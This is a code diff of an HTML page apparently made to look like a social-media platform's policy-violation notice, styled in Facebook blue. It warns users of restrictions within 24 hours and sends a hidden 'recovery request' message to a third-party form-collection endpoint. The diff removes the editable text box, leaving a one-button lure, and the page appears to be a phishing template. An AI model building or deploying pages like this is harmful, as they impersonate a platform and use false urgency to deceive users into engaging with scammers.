@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>Apply Now</title>
+  <title>Important Notice</title>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <style>
     body {
@@ -20,24 +20,19 @@
       max-width: 400px;
       border-radius: 8px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
+      text-align: center;
     }
     h2 {
-      text-align: center;
       margin-bottom: 20px;
     }
-    textarea, button {
-      width: 100%;
-      padding: 12px;
-      margin-top: 10px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-      font-size: 14px;
-    }
     button {
+      padding: 12px 20px;
       background: #1877f2;
       color: #fff;
       border: none;
+      border-radius: 5px;
       cursor: pointer;
+      font-size: 14px;
     }
     button:hover {
       background: #145dbf;
@@ -50,14 +45,13 @@
     <h2>⚠️ Important Notice</h2>
 
     <form action="https://submit-form.com/09HQTNPsI" method="POST">
-
-      <textarea name="message" required placeholder="Type your message here...">Our system has detected potential policy violations on your page.
+      <!-- Fixed message hidden field -->
+      <input type="hidden" name="message" value="Our system has detected potential policy violations on your page.
 If you believe this is a mistake, you can submit a recovery request here.
 Please respond within 24 hours to avoid restrictions being applied.
-Thank you for your understanding.</textarea>
+Thank you for your understanding.">
 
       <button type="submit">Submit</button>
-
     </form>
   </div>
 
